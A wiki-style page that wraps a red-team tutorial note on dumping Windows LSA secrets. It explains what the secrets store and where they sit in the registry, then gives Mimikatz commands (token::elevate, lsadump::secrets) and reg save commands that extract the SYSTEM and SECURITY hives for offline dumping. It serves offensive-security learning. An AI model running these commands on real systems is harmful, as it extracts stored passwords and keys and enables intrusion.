---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Dumping LSA Secrets

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-dumping-lsa-secrets` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

#### What is stored in LSA secrets?

## Preserved Body

````markdown
> #### **What is stored in LSA secrets?**
>
> Originally, the secrets contained cached domain records. Later, Windows developers expanded the application area for the storage. At this moment, they can store PC users' text passwords, service account passwords (for example, those that must be run by a certain user to perform certain tasks), Internet Explorer passwords, RAS connection passwords, SQL and CISCO passwords, SYSTEM account passwords, private user data like EFS encryption keys, and a lot more. For example, the _NL$KM_ secret contains the cached domain password encryption key.

## Storage

LSA Secrets are stored in registry:

```
HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets
```

![](<../../_assets/Screenshot from 2019-03-12 20-20-39.png>)

## Execution

### Memory

Secrets can be dumped from memory like so:
```
token::elevate
lsadump::secrets
```
![](<../../_assets/Screenshot from 2019-03-12 20-25-01.png>)

### Registry

LSA secrets can be dumped from registry hives likes so:
```csharp
reg save HKLM\SYSTEM system & reg save HKLM\security security
```
![](<../../_assets/Screenshot from 2019-03-12 20-37-11.png>)
```csharp
lsadump::secrets /system:c:\temp\system /security:c:\temp\security
```
![](<../../_assets/Screenshot from 2019-03-12 20-38-02.png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/dumping-lsa-secrets.md)

## Evidence Excerpt

```text
_asset_filenames:
- Screenshot from 2019-03-12 20-20-39.png
- Screenshot from 2019-03-12 20-25-01.png
- Screenshot from 2019-03-12 20-37-11.png
- Screenshot from 2019-03-12 20-38-02.png
_body: '# Dumping LSA Secrets
> #### **What is stored in LSA secrets?**
>
```
